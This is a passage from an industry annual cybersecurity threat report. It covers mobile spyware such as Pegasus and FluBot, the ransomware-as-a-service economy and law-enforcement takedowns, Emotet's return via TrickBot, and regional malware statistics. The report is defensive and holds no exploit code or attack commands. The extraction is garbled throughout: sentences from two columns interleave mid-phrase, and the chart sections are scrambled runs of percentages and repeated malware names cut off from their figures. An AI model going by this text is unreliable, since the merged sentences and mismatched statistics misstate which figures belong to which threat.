approximately 49% ofsurveyed organizations indicating that they are unable to detect an attack or incidenton employee\-owned devices.We must first address the developmentsbusiness executives worldwide. A list containingaround NSOs Pegasus, one of the mostaround 50,000 potential Pegasus victims wasnotorious mobile malware families. Pegasusleaked and made headlines, possibly sheddingis a mobile spyware capable of infecting bothlight on NSOs customers. The media attentioniOS and Android devices, and was developedled to extensive research in an effort to uncoverand marketed by the Israel\-based NSO Group.Pegasus infection methods and help usersThe spyware can gain full control of a mobiledetect Pegasus on their devices. Eventually,device and harvest a multitude of data typesin September, Apple issued patches for twosuch as messages, photos, calendars, emailszero\-day vulnerabilities in iMessage leveragedand more. Additionally, the malware is capableby Pegasus, assigned CVE\-2021\-30860 andof activating the camera, collecting images, asCVE\-2021\-30858\. These flaws exploit iPhoneswell as recording surrounding conversations.and Macs by allowing malicious documentsPegasus infection is based on an elaboratedto execute commands. In November, Applezero\-click exploit. Though the malware wasfiled a suit against NSO for using their hackingfirst discovered in 2016, in 2019 it was revealedsoftware on Apple devices and stealingthat the spyware leveraged the WhatsAppprivate data. Naturally, the threat actorsservice to infect over 1,400 users, the targets ofquickly tailored an extortion scam based onmultiple NSO customers.In July 2021, a vast collection of news outletsreported that the tool had been used to gainaccess to mobile devices of governmentofficials, journalists, human rights activists andthe scandal. A recent campaign leverages thepublic fear of Pegasus iOS spyware, seeking tointimidate potential victims by spreading emailscontaining ransom demands and claiming tohave private videos of the victims, allegedlytaken by the Pegasus malware.2525CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3Pegasus stands out due to its seamless, zero\-devices that installs the Triada Trojan. Inclick infection process, controversial victim listOctober, researchers found a photo editingand sophisticated data exfiltration features. It isapplication offered on the Google Play Storetherefore not surprising that it is no longer thewhich contained a malicious code that collectedonly one of its kind. Toward the end of the year,users Facebook credentials and used them toresearchers exposed an additional threat actorrun ad campaigns with the victims paymentin the private sector mobile spyware arena.information. The app was downloaded byCytrox, a company based in North Macedonia,thousands of users. Finally, in November, a newmarkets a spyware called Predator for iPhoneAndroid malware called MasterFred rose todevices, which infects the customers targetsprominence due to its use of fake login overlaysvia single\-click links sent over WhatsApp. Asto steal credit card information from Netflix,more and more information about the malwareInstagram and Twitter users.capabilities is exposed, the greater the chancethat these will be adopted by common threatactors and groups. In addition, the widedistribution of mobile spyware and the attentionthis field has attracted in 2021 are yet furtherindications of the crucial role mobile devicesplay in the cyber threat landscape.Another significant attack vector that wasprominent in 2021 relies on SMS messagesfor malware distribution. SMiShing, short forSMS phishing, is a phishing technique thatrelies on mobile devices for social engineeringdistribution, and uses SMS messages as theattack vector. The FluBot Android botnet, whichThroughout the year, we observed threat actorsrelies on this technique, resumed its activitiesinvesting substantial efforts in hacking topin April 2021 despite designated arrests by thesocial media accounts such as Facebook andSpanish police. In September, the botnet addedTelegram. These efforts included the executionto its arsenal a new method to compromiseof large\-scale attack campaigns aimed atAndroid devices, and began spreading a fakeobtaining access to mobile devices. In August,security update message, warning of a FluBota new Android Trojan called FlyTrap wasinfection. The infection is triggered once thefound to have compromised at least 10,000victim clicks on the install security updateFacebook accounts across 144 counties sincebutton. FluBot appeared again in NovemberMarch 2021, predominantly through maliciousin a campaign targeting Finnish users. Afterapplications available on the Google Play Store.the attack vector demonstrated its efficiencyThe applications were uploaded and quicklyin FluBots campaigns, SMiShing has beenremoved from the platform but were latergradually adopted by low\-skilled actors. Foravailable on third\-party app stores. Attackersexample, a recent investigation conducted byalso leveraged WhatsApp to distribute aCheck Point Research indicated that SMiShingmodified version of the app for Androidattacks are very effective in Iran, despite the2626CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3general low quality of the actors toolsets.Finally, systematic changes caused by theThese campaigns utilize SMiShing while alsoglobal pandemic are also affecting the mobileimpersonating key entities such as the Iranianbanking malware arena. The expandinggovernment, the judiciary system, shoppingdigitization of the banking sector in 2021 led toportals and more. Many warnings about thisthe surfacing of various applications designednow thriving attack method appeared in newsto limit offline interactions, which in turnoutlets. The scale of the recent attack wave ishave led to the distribution of new threats. Inunprecedented, which comes as no surprise ifSeptember, Check Point Research uncovered ayou inspect the flourishing botnet\-as\-a\-servicenew attack method against Android users thatmarket taking place in underground forums andabuses the devices accessibility services. TheTelegram channels. Phishing kits are availableattack targeted users of PIX, a year\-old, yetfor prices ranging from USD$ 50\-US$ 100\. Weextremely popular, instant payment solutionestimate that similar campaigns, also inspiredcreated and managed by the Brazilian Centralby FluBots successful use of SMiShing, mightBank. The campaign featured two variants ofsoon appear in other countries as well.banking malware distributed by two maliciousAnother extensive scam that took place in 2021revolving around SMS messages is UltimaSMS,a massive campaign that utilizes around 150Android applications. With more than 10 milliondownloads from the Google Play Store, its trickis to lure victims into subscribing to premiumSMS services without their knowledge.applications on the Google Play Store. The moreunique one, called PixStealer, abused AndroidsAccessibility Services (A AS) to steal moneyfrom a specific bank through PIX transactions.This minimalistic yet innovative combination offunctions allows the malware to collect fundswithout interacting with a C\&C, helping it toremain undetected. Due to its simplicity andefficiency, we can expect other threat actors tofollow this lead.2727CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3CRACKS IN THE RANSOMWARE ECOSYSTEMGone are the days when ransomware operators negotiated a ransom of US$ 200 for yourfamily photos. Todays ransomware economy is a complex operation extorting millionsof dollars per ransom, holding entire organizations captive under the threat of totalsystem shutdown. The evolution of the ransomware business model is at the core of thisphenomenon. Ransomware\-as\-a\-Service (RaaS) introduces affiliate programs at lowonboarding costs, enabling any attacker to easily join the trend. The attacker selects one ofthe leading ransomware projects and follows the detailed, easy to follow complimentaryoperations manual, which contains complete instructions for every stage of the attack. If theintrusion was successful, the ransomware operators and affiliates share a percentage ofthe victims ransom payment. This extremely profitable scheme allows attackers to reach awider range of victims and offers higher returns to all involved.The ransomware operators are the backboneThis was a turbulent year for severalof the whole operation, offering not just theransomware groups, not the least becauseransomware itself, but also money launderinggovernments and law enforcement agenciesservices and negotiation specialists. Thechanged their stance against organized threatdifferent ransomware programs compete foractors. They turned from preemptive andaffiliates, so ransomware groups are constantlyreactive measures to proactive offensivedeveloping more attractive tools and servicesoperations targeting the ransomwarefor their affiliate programs in order to helpoperators themselves, as well as their fundsthem stand out in a competitive undergroundand supporting infrastructure. The majorcommunity. Reputation is a key motivatingshift happened following the Colonial Pipelinefactor, as that can influence a groupsincident in May, where a DarkSide ransomwarechances of earning big returns or even lead toattack resulted in a major fuel shortageapprehension by the authorities. Its thereforethroughout the East Coast in the US, thusnot surprising that cybercriminals mediate theircausing the Biden administration to realize theyinternal disputes on tribunal forums, wherehad to step up efforts to combat the threat.losing a case can cost a group their reputationand profits.2828CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3Later that month, the DarkSideissued its Ransomware Action Plan, whichgang announced they were shutting downincludes the formation of a new special task forceoperations after their servers were seizedand harsher punishments for ransomware actors.and their cryptocurrency funds, which wereused to pay affiliates of the Ransomware\-as\-a\-Service program, were stolen. InJune, the US Department of Justice (DOJ)upgraded ransomware to a national securitythreat, placing it at the same priority level asterrorism. The next major incident surroundedthe Kaseya MSP platform breach in July,after which REvil perpetrators mysteriouslydisappeared, taking their leaks website HappyBlog offline and apparently shutting down theircustomer support. However, this shutdownwas short\-lived and the group resurfaced inSeptember. Then, they disappeared again inOctober after a suspected law enforcementoperation successfully hijacked theirinfrastructure and Happy Blog.In September, the Biden administration tooktheir war against ransomware a step furtherand announced they would begin sanctioningcrypto exchanges, wallets and traders thatransomware threat actors use to convertransom payments into tangible funds. TheRussian\-based SUEX exchange was the first tobe added to the sanctions list for their part inransom transactions. The next month, theEuropean Union and an additional 31 countriesannounced they would join the effort to disruptadditional cryptocurrency channels, in anattempt to cripple the money launderingprocess. In addition, the Australian GovernmentIn November, an international joint operationled by Interpol named Operation Cyclone,led to infrastructure seizure and arrests ofmoney laundering affiliates for Cl0p, the groupresponsible for the Accellion breach, whichwas the source of numerous double and tripleextortions. In addition, the US DOJ and otherfederal agencies pursued further actionsagainst REvil. These actions included membersarrests, the seizure of US$ 6 million worth ofransom money, confiscation of devices and abounty program worth US$ 10 million.The reaction to these developments variedwidely within the ransomware ecosystem. Somegroups showed hostility and applied even morepressure on their victims to keep authoritiesaway from their business. For example,Grief Ransomware threatened to completelydelete their victims decryption keys shouldthey hire professional negotiators. Similarly,RagnarLocker posted online all of the contentstolen from victims that contacted the FBI orother law enforcement agencies.Other groups appear to have concentrated onadapting and rebranding themselves to avoidbeing too closely associated with a prominentattack. Darkside, for example, temporarilyexited the ransomware arena and at leastsome of its members rebranded themselvesas BlackMatter in July. They carried out2929CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R3attacks against the marketing service providerFinally, this past year, we also saw signs ofMarketron, the Japanese tech companythe ransomware community cracking underOlympus, and critical infrastructure such aspressure or even closing shop altogether,the New Cooperative farmers organization inwith some operators completely abandoningIowa. However this rebranded operation wastheir businesses. For instance, the Avaddonshort lived, when in November, BlackMattercybercrime gang first appeared in Juneannounced they were shutting down due to2020, but only a year later was compelledpressure from the authorities. They even saidto shut down and release decryption keys,that their team members were no longerundoubtedly due to the increased scrutiny byavailable after the latest news, yet expertslaw enforcement. In another instance, Contibelieve that this exit was a result of trust issuesransomware targeted British Graff Jewelry,with their affiliates due to flawed encryption,but later issued an apology after realizingallowing a security company to decrypt victimsthat some of the stolen data belonged to thefiles. In a final testament to undergroundSaudi, UAE \& Qatar Royal Families. Fearingcooperation, BlackMatter has partnered withretaliation, they promised to delete the dataLockBit ransomware and transferred theirwithout review. Major cybercrime forumsvictims to the LockBit platform to facilitate abanned any ransomware advertising from theirseamless extortion, just before vanishing.platform to avoid drawing attention. This madeUnfortunately, not all ransomware groupsexhibited this harmonious cooperation. Thefear of being apprehended by the authoritiesit more difficult for operators to effectivelycommunicate with affiliates, adding to the riskof being caught.was compounded by marked distrust promotedProactive measures and offensive operationsby constant competition. For example, REvilby governments worldwide have managedoperators were caught cheating their affiliatesto put a noticeable dent in the ransomwareby hijacking the ransom negotiation process,ecosystem, disrupting ransomware operationsusing double chats and backdoors to cut themand causing havoc in the underground scene.out of their shares. The Conti group experiencedDespite this, millions of dollars in potentialan internal crisis after one disgruntled affiliaterevenue mean that we will likely see moreleaked Contis playbook, complaining of lowransomware projects coming up in 2022,compensations.with successful ones serving as a model forupcoming and improved attacks. One takeawaythe ransomware operators may have fromthe events of 2021 is that the type of targetsransomware operators choose might be thedifference between a long term operation or avery short one.3030CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R404MALWARE SPOTLIGHT: 
EMOTETS RETURN EMOTET, ONE OF THE MOST DANGEROUS AND INFAMOUS BOTNETSIN HISTORY, IS BACK, DESPITE THE LONG AND SYNCHRONIZEDEFFORTS OF THE INTERNATIONAL COMMUNITY AND LAWENFORCEMENT AGENCIES WORLDWIDE THAT RESULTED IN ITSTAKE DOWN IN JANUARY 2021\.31CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R4A LEXANDR AG OFMA NTeam Leader,
Check Point ResearchTowards the end of the year the world came to therealization that even an international task force, couldonly slow Emotet down, and not eradicate it altogether.At least some of its group members were able to eludejustice and have taken their time to reorganize, regroup,and to use their old underground connections to launcha new and improved global malspam campaign.Trickbot and Emotet are old partners in crime, so in manyways it was unsurprising that Emotet would leverageTrickBots service as a dropper for its own revival."Emotet, one of the most dangerous and infamous botnets in history, is back, despite thelong and synchronized efforts of the international community and law enforcement agenciesworldwide that resulted in its take down in January 2021\. Emotet, the banking Trojan turnedmodular botnet, is known for its massive reach of over 1\.5 million infected computersworldwide, across thousands of compromised corporate networks. Emotet was used as adistribution platform to deliver other notorious malware families such as TrickBot, Qbotand Dridex, often resulting in network\-wide ransomware attacks that crippled entireorganizations. Inflicted damages were estimated at around US$ 2\.5 billion, before it wasforcibly shut down.3232CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R4On November 14th, Emotet officially rose from the dead, as live samples were observedfor the first time since its takedown. Emotets resurrection came from a surprisingsource: TrickBots botnet was used to drop Emotets samples on machines infected withthe TrickBot malware. The very next day, Emotet returned to its signature method ofdistribution, with massive spam campaigns delivering the Trojan via malicious documentattachments. To rebuild their network, Emotet operators chose to drop their spam bot onsuccessfully infected machines, a method that enabled them to distribute the malware toeven more potential targets.TrickBots service as a dropper was a natural choice for Emotets revival, thanks to theirrich history of collaboration. In fact, this might suggest that at least some of its oldmalware partners are also involved in its resurrection. TrickBot itself was briefly takendown in 2020, and yet it persisted and was featured in the Top Malware families rankingsof May, June and September 2021\. During the last year, Check Point Research spottedover 140,000 TrickBot victims worldwide, involving over 200 campaigns and thousands ofcompromised networks. This huge installation base makes TrickBot the perfect platform tore\-launch Emotets new botnet.Emotet itself came back even stronger with some new additions to its toolbox. Theupgraded variant uses Elliptic curve cryptography as opposed to RSA cryptography,improved its control\-flow flattening techniques, and added to its initial delivery methodsthe use of malicious Windows App installer packages that impersonate legitimate software.In addition, researchers found that Emotet is now dropping Cobalt Strike beacons directlyfor the first time, instead of intermediate malware families which in turn would dropCobalt Strike beacons after some time. Cobalt Strike has been the cornerstone of targetedransomware attacks in previous years, and this unfortunate development means that theduration from initial Emotet infection to a full blown ransomware attack just got evenshorter, leaving the defenders with far less time to respond to an ongoing attack.Since its return, Check Point Research observed that the volume of Emotets activity was atleast 50% of the level we saw in January 2021, right before the takedown. This rising trendcontinued throughout December with several end\-of\-the\-year campaigns, and is expectedto continue well into 2022, at least until the next takedown attempt.3333CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R505GLOBAL STATISTICS IN 2021, THERE WAS A 50% INCREASE IN OVERALL ATTACKS PERWEEK ON CORPORATE NETWORKS COMPARED TO 2020\.34CHECK POINT SOFTWARE\|SECURITY REPORT 2022CYBER ATTACK CATEGORIES BY REGIONGLOBAL31%BOTNETINFOSTEALERCRYPTOMINERSBANKINGMOBILE14%RANSOMWARE
8%21%19%19%Figure 1: Percentage of corporate networks attacked by each malware type globally.AMERICAS25%18%BOTNETINFOSTEALERCRYPTOMINERSBANKINGMOBILERANSOMWARE6%15%15%14%Figure 2: Percentage of corporate networks attacked by each malware type in the Americas.CHECK POINT SOFT WARE\|SECURITY REPORT 2022
CHECK POINT SOFT WARE\|SECURITY REPORT 202235
3535CHECK POINT SOFTWARE\|SECURITY REPORT 2022CYBER ATTACK CATEGORIES BY REGIONEMEA30%23%19%19%BOTNETINFOSTEALERCRYPTOMINERSBANKINGMOBILE14%RANSOMWARE8%Figure 3: Percentage of corporate networks attacked by each malware type in EMEA.APAC43%30%25%25%BOTNETINFOSTEALERCRYPTOMINERSBANKINGMOBILE13%RANSOMWARE
10%Figure 4: Percentage of corporate networks attacked by each malware type in APAC.CHECK POINT SOFT WARE\|SECURITY REPORT 2022
CHECK POINT SOFT WARE\|SECURITY REPORT 202236
36C HAPTE R5GLOBAL THREAT INDEX MAPThe map displays the cyber threat risk index globally, demonstrating themain risk areas around the world Darker \= Higher Risk\*Grey \= Insufficient DataFigure 5\. Global Threat Index Map3737CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5Education ResearchGovernment MilitaryCommunicationsISP MSPHealthcareSI VAR DistributorUtilitiesManufacturingFinance BankingInsurance LegalLeisure HospitalityConsultantSoftware VendorRetail WholesaleTransportationHardware Vendor1605(\+75%)1136(\+47%)1079
1068(\+51%)(\+67%)830(\+71%)778(\+18%)736(\+46%)704
703(\+41%)(\+53%)636
595
576(\+68%)(\+40%)(\+73%)536
526
501(\+146%)(\+39%)(\+34%)367(\+16%)Figure 6: Average weekly attacks per organization by Industry 2021, compared to 2020\.During 2021, global cyber attacks against corporate networks has increased by50%, in comparison to 2020\. The EducationResearch category leads as the mosttargeted sector, with an average of 1,605 attacks per organization every week(75% increase), while the Software Vendor category shows the largest year\-on\-year growth, with an increase of 146%. The rise in attacks against softwarevendors goes hand\-in\-hand with the ever\-growing trend of software supply chainattacks observed during 2021\.3838CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5TOP MALICIOUS FILE T YPES WEB VS. EMAIL52%20%5%doc3%3%xlsxlsxexepdf2%jar2%bat1%docx1%ps11%apk10%otherFigure 7: Web Top malicious file types.34%16%9%7%7%6%6%exexlxspdfrtfdocxls mdocx5%xls3%xlsb2%ppt6%otherFigure 8: Email Top malicious file types.3939CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R520192020202136%64%17%16%83%84%EMAILWEBFigure 9: Distribution protocols email vs web attack vectors during 2019, 2020 \& 2021\.The charts above indicate that the email attackOne of the reasons for this rise in email\-basedvector has steadily established itself as aattacks is the massive number of high\-profilefavorite, compared to slowly diminishing use ofcampaigns sponsored and run by large crimewebsites to distribute malware payloads sincegroups, who distribute the most prominentthe beginning of 2020\.malware families today, such as TrickBot,Whether used in a targeted attack, or as partDridex, Qbot, IcedID, or Emotet.of an opportunistic campaign by a noviceOnce these gangs realized the effectivenessattacker, email\-based attacks allow for theof spam campaigns with malicious Officeeasy distribution of malware to a wide array ofdocument attachments, they used it almosttargets and corporations.exclusively as their main infection vector intonew networks.4040CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5GLOBAL MALWARE STATISTICS
Data comparisons presented in the following sections of this report are based on data drawn from the 
Check Point ThreatCloud Cyber Threat Map between January and December 2021\.For each of the regions below, we present the most prevalent malware.TOP MALWARE FAMILIESGLOBAL11\.0%5\.2% 5\.0% 4\.9%4\.4% 4\.1% 4\.0% 4\.0% 3\.7% 3\.5%TrickbotQ bot
For m bookE m otetA gentTesla
D ridexP horpiexR e m cosGlu ptebaX M RigFigure 10: Most prevalent malware globally. 
Percentage of corporate networks attacked by each malware family.AMERICAS9\.7%3\.6% 3\.5% 3\.5%3\.0% 3\.0% 2\.9%2\.6% 2\.4% 2\.4%TrickbotR e m cosFor m bookP horpiexD ridexE m otetQ botGlu ptebaX M RigR accoonFigure 11: Most prevalent malware in the Americas.4141CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5EUROPE, MIDDLE EAST AND AFRICA (EMEA)10\.8%7\.8%5\.9%5\.4%5\.0% 4\.7%4\.2%3\.6% 3\.6% 3\.3%TrickbotQ botE m otetD ridexFor m bookA gentTeslaR e m cosP horpiexX M RigGlu ptebaFigure 12: Most prevalent malware in EMEA.ASIA PACIFIC (APAC)14\.5%7\.8% 7\.5%7\.1% 6\.9%6\.2% 6\.0% 5\.7%4\.8% 4\.8%TrickbotFor m bookR a m nitGlu ptebaA gentTeslaP horpiexE m otetX M RigD ridexU rsnifFigure 13: Most prevalent malware in APAC.4242CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5GLOBAL ANALYSIS OF TOP MALWARESome noticeable changes since our last yearly global malware ranking, are thatRigEK (Exploit Kit) and LokiBot infostealer are no longer present in our top 10,replaced by Glupteba botnet and Remcos RAT.TrickBot rose to the top of the chart in February, replacing Emotet, and kept thisranking for the rest of 2021\. TrickBot is a modular Botnet and Banking Trojanthat targets the Windows operating system. It is credited with Emotets revivalin November 2021 as it was found distributing its fellow malware. TrickBot isconstantly being updated with enhanced capabilities, features and distributionvectors, making it a flexible and customizable malware that can be distributedas part of multi\-purpose campaigns. It served as a popular means for initialaccess in targeted attacks followed by malware such as Ryuk, Conti or Bazar.Despite TrickBots brief takedown in October 2020, it remained prominent in ourtop malware charts throughout 2021, and was involved in one of the most seriousransomware attacks of the year, a Conti ransomware attack on Irelands HealthService Executive.Phorpiex is a botnet which at its peak controlled more than a million infectedhosts. It is known for distributing other malware families via spam campaigns aswell as fueling large\-scale spam, sextortion campaigns or ransomware spread.Phorpiex, which hit its low mid\-year, ended up with a higher ranking by the end of2021 than it had a year ago. In December, Check Point Research spotted Phorpiexsresurgence with a brand\-new variant called Twizt, which enabled it to operatein peer\-to\-peer mode without active C\&C servers. In one year, Phorpiex botssuccessfully hijacked 969 transactions and stole 3\.64 Bitcoin, 55\.87 Ether, and US$55,000 in ERC20 tokens accounting for almost half a million US dollars.4343CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5TOP BOTNETSGLOBALAMERICAS12%12%12%10%12%29%10%
10%10%12%
13%
12%
13%29%14%13%
14%13%10%
TrickBot
10%
Qbot
10%
TrickBot
Emotet
Qbot
Dridex
10%
Emotet
Phorpiex
Dridex
Glupteba
Phorpiex
Other
Glupteba12%12%TrickBotQbot
TrickBot
Emotet
Qbot
Dridex
Emotet
Phorpiex
Dridex
Glupteba
Phorpiex
Other
GluptebaOtherOther29%29%14%14%TrickBotPhorpiex
TrickBot
Dridex
Phorpiex
Emotet
Dridex
Qbot
Emotet
Glupteba
Qbot
Other
Glupteba10%10%10%10%10%10%TrickBot10%Phorpiex
11%
TrickBot
Dridex
Phorpiex
11%
Emotet
Dridex
Qbot
Emotet
Glupteba
Qbot
Other
Glupteba11%11%10%11%11%11%11%11%11%35%35%35%35%12%
11%
12%
11%12%12%OtherOtherFigure 14: Most prevalent botnets globallyFigure 15: Most prevalent botnets in the AmericasEUROPE, MIDDLE EAST AND AFRICA (EMEA)ASIA PACIFIC (APAC)9%9%8%9%8%9%27%8%9%27%27%27%23%23%23%23%TrickBotTrickBot27%27%13%27%27%13%13%6%6%9%Glupteba
TrickBot
Phorpiex
Glupteba
Emotet
Phorpiex
Dridex
Emotet
MyloBot
Dridex
Other
MyloBotGlupteba
6%
TrickBot
Phorpiex
Glupteba
6%
Emotet
Phorpiex
Dridex
Emotet
MyloBot
Dridex
Other
MyloBot9%9%OtherOther11%9%11%
11%13%11%11%11%
11%11%9%
13%13%15%19%15%19%19%19%15%15%TrickBotQbot
TrickBot
Emotet
Qbot
Dridex
Emotet
Phorpiex
Dridex
Glupteba
Phorpiex
Other
GluptebaTrickBot
9%8%Qbot
TrickBot
9%
Emotet
Qbot
13%
Dridex
Emotet
Phorpiex
13%
Dridex
Glupteba
Phorpiex
Other
GluptebaOtherOtherFigure 16: Most prevalent botnets in EMEAFigure 17: Most prevalent botnets in APAC4444CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5BOTNET GLOBAL ANALYSISOverall, we are seeing the same malware families in our top global botnet chartsas 2020, with minor changes to the prevalence of each family. Dridex, for example,went down from second to fourth place whereas TrickBot rose to first place.Emotet, one of the most infamous malware groups, has been operating in intervalssince 2014, first as a banking trojan and then later as a botnet. It now appears inthe number three spot on the top botnet chart. Emotet was wide\-spread before itstakedown in January 2021, affecting more than 1\.5 million machines globally withdamages estimated at around US$ 2\.5 billion. It is notorious for spreading othermalware families including TrickBot, Qbot and more.The Botnet marketplace this year was drastically affected by Emotets downfall.Emotet is one of the largest PC botnet operations and its absence left a vacuumfilled by TrickBot, IcedID, and more recently Phorpiex. On November 15, just10 months after its takedown, machines infected with TrickBot started to dropEmotet samples. Computers were increasingly compromised by a large malspamcampaign which leveraged malicious documents containing the Emotet payload.We note that both our H1 2021 and global 2021 charts showed Emotet in the topthree places, despite nine months of no activity a tribute to its unequaled power.4545CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5TOP INFOSTEALER MALWAREGLOBALAMERICAS16%16%16%16%13%13%13%
9%13%
9%38%38%7%7%9%7%9%
8%9%7%8%8%8%9%9%9%FormbookAgentTesla
Formbook
Raccoon
AgentTesla
LokiBot
Raccoon
Vidar
LokiBot
NanoCore
Vidar
Other
NanoCoreFormbook
38%
AgentTesla
Formbook
38%
Raccoon
AgentTesla
LokiBot
Raccoon
Vidar
LokiBot
NanoCore
Vidar
Other
NanoCoreOtherOther18%18%18%18%12%12%12%12%10%10%10%
7%8%10%8%7%6%8%6%8%7%7%39%39%FormbookRaccoon
Formbook
AgentTesla
Raccoon
Vidar
AgentTesla
RedLine Stealer
Vidar
LokiBot
RedLine Stealer
Other
LokiBotFormbook
39%
Raccoon
Formbook
39%
AgentTesla
Raccoon
Vidar
AgentTesla
RedLine Stealer
Vidar
6%
LokiBot
RedLine Stealer
Other
6%
LokiBotOtherOtherFigure 18: Top infostealer malware globallyFigure 19: Top infostealer malware in the AmericasEUROPE, MIDDLE EAST AND AFRICA (EMEA)ASIA PACIFIC (APAC)42%42%FormbookFormbook
42%
AgentTesla
AgentTesla
Formbook
Formbook
LokiBot
LokiBot
42%
AgentTesla
AgentTesla
Raccoon
Raccoon
LokiBot
LokiBot
Vidar
Vidar
Raccoon
Raccoon
Snake Keylogger
Snake Keylogger
Vidar
Vidar
Other
Other
Snake Keylogger
Snake Keylogger7%7%OtherOther14%14%14%14%13%13%9%13%13%9%8%
7%
8%
7%9%
7%7%7%7%8%9%8%FormbookAgentTesla
Formbook
LokiBot
AgentTesla
Vidar
LokiBot
NanoCore
Vidar
Raccoon
NanoCore
Other
Raccoon33%
FormbookAgentTesla
33%
Formbook
LokiBot
AgentTesla
Vidar
LokiBot
NanoCore
Vidar
Raccoon
NanoCore
Other
Raccoon7%7%OtherOther33%33%7%8%
7%8%7%7%18%18%18%18%16%16%16%16%11%11%7%7%8%8%11%11%Figure 20: Top infostealer malware in EMEAFigure 21: Top infostealer malware in APAC4646CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5INFOSTEALER MALWARE GLOBAL ANALYSISThe infostealer landscape is still dominated by several stealthy malware families.AgentTesla, a prominent commodity infostealer first discovered in 2014, showed asignificant decrease in prominence compared to 2020, with a drop of 50%. LokiBot,a commodity infostealer that emerged in 2016, experienced a similar decrease.Topping the chart is Formbook, a commodity infostealing malware sold as\-a\-service on underground forums since 2016\. The malware is designed to collectinformation via keylogging. In mid\-2021, a new Formbook variant was detectedin the wild. The variant was distributed in a phishing campaign leveragingPowerPoint documents as email attachments for malware delivery.Another malware\-as\-a\-service that entered our top malware statistics for thefirst time is Raccoon. This infostealer, sold on the Dark Web for at least two years,offers a well\-maintained platform for its affiliates that features rapid bug fixesand automated updates to its payload, as well as malware installed on victimmachines.Raccoons recent updates include the ability to steal cryptocurrency, drop furthermalware, and spread via Google SEO instead of phishing emails. The currentcampaign attempts to lure its victims by offering cracked software licenses.4747CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5TOP CRYPTOMINING MALWAREGLOBALAMERICAS33%XMRig33%XMRigLemonDuck
XMRig
RubyMiner
LemonDuck
WannaMine
RubyMiner
NRSMiner 
WannaMine
Other
NRSMinerLemonDuck
XMRig
RubyMiner
4%
LemonDuck
WannaMine
6%
RubyMiner
4%
NRSMiner 
WannaMine
6%
Other
NRSMinerOtherOther33%33%4%6%
8%
6%
8%6%4%6%43%43%6%6%8%8%27%27%27%27%XMRig2%
RubyMiner
2%
XMRig
LemonDuck
2%
7%
RubyMiner
DarkGate
2%
LemonDuck
7%
Kinsing
DarkGate
Other
Kinsing2%
2%
2%
7%
2%
7%12%12%12%12%43%XMRig43%RubyMiner
XMRig
LemonDuck
RubyMiner
DarkGate
LemonDuck
Kinsing
DarkGate
Other
KinsingOtherOther50%50%50%50%Figure 22: Top cryptomining malware globallyFigure 23: Top cryptomining malware in the AmericasEUROPE, MIDDLE EAST AND AFRICA (EMEA)ASIA PACIFIC (APAC)15%15%6%15%6%15%XMRig42%XMRigLemonDuck
XMRig
RubyMiner
LemonDuck
DarkGate
RubyMiner
Kinsing
DarkGate
Other
KinsingLemonDuck
42%
XMRig
RubyMiner
LemonDuck
DarkGate
RubyMiner
Kinsing
DarkGate
Other
KinsingOtherOther42%42%41%41%41%41%5%4%3%
5%4%3%5%
5%4%3%
5%
5%4%3%5%5%XMRigXMRig6%8%LemonDuck
XMRig
WannaMine
LemonDuck
NRSMiner
WannaMine
RubyMiner
NRSMiner
Other
RubyMinerLemonDuck
8%
XMRig
WannaMine
13%
LemonDuck
NRSMiner
WannaMine
13%
RubyMiner
NRSMiner
Other
RubyMinerOtherOther6%8%8%13%13%
15%15%43%43%43%43%15%15%Figure 24: Top cryptomining malware in EMEAFigure 25: Top cryptomining malware in APAC4848CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5CRYPTOMINERS GLOBAL ANALYSISXMRig, a legitimate Monero mining tool that was leveraged by threat actors formalicious purposes, not only continues to top the Cryptominer chart, but also rosein popularity by over 25% compared to 2020\. Two malware families entered thecryptominer chart for the first time this year: LemonDuck, which is already secondto XMRig, and CryptoBot.LemonDuck, which showed an over 50% growth in attack rate compared to themid\-year statistics, is a self\-propagating cryptomining botnet that featurescredential theft, detection evasion and lateral movement capabilities. LemonDuckalso functions as a malware downloader, and is often observed dropping theRamnit Trojan.CryptoBot is an advanced cryptominer that collects the victims wallet andaccount information upon infection. In December CryptoBot was observed in acampaign that targets users with a pirated copy of the Windows operating system.The campaign leverages a designated activation tool called KMSPico that tricksWindows Key Management Services (KMS) into authenticating 